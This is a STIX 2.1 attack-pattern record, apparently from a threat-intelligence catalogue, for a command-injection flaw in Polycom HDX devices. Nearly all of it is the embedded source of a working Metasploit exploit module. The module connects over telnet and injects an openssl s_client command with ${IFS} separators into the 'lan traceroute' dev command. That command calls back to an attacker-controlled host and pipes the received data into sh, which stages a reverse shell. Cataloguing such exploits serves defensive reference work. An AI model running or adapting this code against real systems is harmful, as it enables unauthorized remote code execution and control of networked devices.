{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5753991a-f649-47a8-ae13-521068c0b19e",
    "created": "2024-08-14T17:14:21.001169Z",
    "modified": "2024-08-14T17:14:21.001173Z",
    "name": "Polycom Shell HDX Series Traceroute Command Execution",
    "description": " Within Polycom command shell, a command execution flaw exists in lan traceroute, one of the dev commands, which allows for an attacker to execute arbitrary payloads with telnet or openssl. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/misc/polycom_hdx_traceroute_exec.rb",
            "external_id": "polycom_hdx_traceroute_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://staaldraad.github.io/2017/11/12/polycom-hdx-rce/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Polycom Shell HDX Series Traceroute Command Execution',\n      'Description' => %q{\n        Within Polycom command shell, a command execution flaw exists in\n        lan traceroute, one of the dev commands, which allows for an\n        attacker to execute arbitrary payloads with telnet or openssl.\n      },\n      'Author' => [\n        'Mumbai', #\n        'staaldraad', # https://twitter.com/_staaldraad/\n        'Paul Haas <Paul [dot] Haas [at] Security-Assessment.com>', # took some of the code from polycom_hdx_auth_bypass\n        'h00die <mike@shorebreaksecurity.com>' # stole the code, creds to them\n      ],\n      'References' => [\n        ['URL', 'https://staaldraad.github.io/2017/11/12/polycom-hdx-rce/']\n      ],\n      'DisclosureDate' => '2017-11-12',\n      'License' => MSF_LICENSE,\n      'Platform' => 'unix',\n      'Arch' => ARCH_CMD,\n      'Stance' => Msf::Exploit::Stance::Aggressive,\n      'Targets' => [[ 'Automatic', {} ]],\n      'Payload' => {\n        'Space' => 8000,\n        'DisableNops' => true,\n        'Compat' => { 'PayloadType' => 'cmd', 'RequiredCmd' => 'telnet generic openssl'}\n      },\n      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse' },\n      'DefaultTarget' => 0\n    ))\n\n    register_options(\n    [\n      Opt::RHOST(),\n      Opt::RPORT(23),\n      OptString.new('PASSWORD', [ false, \"Password to access console interface if required.\"]),\n      OptAddress.new('CBHOST', [ false, \"The listener address used for staging the final payload\" ]),\n      OptPort.new('CBPORT', [ false, \"The listener port used for staging the final payload\" ])\n    ])\n  end\n\n  def check\n    connect\n    Rex.sleep(1)\n    res = sock.get_once\n    disconnect\n    if !res && !res.empty?\n      return Exploit::CheckCode::Unknown\n    elsif res =~ /Welcome to ViewStation/ || res =~ /Polycom/\n      return Exploit::CheckCode::Detected\n    end\n    Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    unless check == Exploit::CheckCode::Detected\n      fail_with(Failure::Unknown, \"#{peer} - Failed to connect to target service\")\n    end\n\n    #\n    # Obtain banner information\n    #\n    sock = connect\n    Rex.sleep(2)\n    banner = sock.get_once\n    vprint_status(\"Received #{banner.length} bytes from service\")\n    vprint_line(\"#{banner}\")\n    if banner =~ /password/i\n      print_status(\"Authentication enabled on device, authenticating with target...\")\n      if datastore['PASSWORD'].nil?\n        print_error(\"#{peer} - Please supply a password to authenticate with\")\n        return\n      end\n      # couldnt find where to enable auth in web interface or telnet...but according to other module it exists..here in case.\n      sock.put(\"#{datastore['PASSWORD']}\\n\")\n      res = sock.get_once\n      if res =~ /Polycom/\n        print_good(\"#{peer} - Authenticated successfully with target.\")\n      elsif res =~ /failed/\n        print_error(\"#{peer} - Invalid credentials for target.\")\n        return\n      end\n    elsif banner =~ /Polycom/ # praise jesus\n      print_good(\"#{peer} - Device has no authentication, excellent!\")\n    end\n    do_payload(sock)\n  end\n\n  def do_payload(sock)\n    # Prefer CBHOST, but use LHOST, or autodetect the IP otherwise\n    cbhost = datastore['CBHOST'] || datastore['LHOST'] || Rex::Socket.source_address(datastore['RHOST'])\n\n    # Start a listener\n    start_listener(true)\n\n    # Figure out the port we picked\n    cbport = self.service.getsockname[2]\n    cmd = \"devcmds\\nlan traceroute `openssl${IFS}s_client${IFS}-quiet${IFS}-host${IFS}#{cbhost}${IFS}-port${IFS}#{cbport}|sh`\\n\"\n    sock.put(cmd)\n    if datastore['VERBOSE']\n      Rex.sleep(2)\n      resp = sock.get_once\n      vprint_status(\"Received #{resp.length} bytes in response\")\n      vprint_line(resp)\n    end\n\n    # Give time for our command to be queued and executed\n    1.upto(5) do\n      Rex.sleep(1)\n      break if session_created?\n    end\n  end\n\n  def stage_final_payload(cli)\n    print_good(\"Sending payload of #{payload.encoded.length} bytes to #{cli.peerhost}:#{cli.peerport}...\")\n    cli.put(payload.encoded + \"\\n\")\n  end\n\n  def start_listener(ssl = false)\n    comm = datastore['ListenerComm']\n    if comm == 'local'\n      comm = ::Rex::Socket::Comm::Local\n    else\n      comm = nil\n    end\n\n    self.service = Rex::Socket::TcpServer.create(\n      'LocalPort' => datastore['CBPORT'],\n      'SSL'       => ssl,\n      'SSLCert'   => datastore['SSLCert'],\n      'Comm'      => comm,\n      'Context'   =>\n      {\n        'Msf'        => framework,\n        'MsfExploit' => self\n      }\n    )\n\n    self.service.on_client_connect_proc = proc { |client|\n      stage_final_payload(client)\n    }\n\n    # Start the listening service\n    self.service.start\n  end\n\n  # Shut down any running services\n  def cleanup\n    super\n    if self.service\n      print_status(\"Shutting down payload stager listener...\")\n      begin\n        self.service.deref if self.service.is_a?(Rex::Service)\n        if self.service.is_a?(Rex::Socket)\n          self.service.close\n          self.service.stop\n        end\n        self.service = nil\n      rescue ::Exception\n      end\n    end\n  end\n\n  # Accessor for our TCP payload stager\n  attr_accessor :service\nend\n",
    "x_mitre_disclosure_date": "2017-11-12",
    "x_mitre_platforms": [
        "unix'"
    ]
}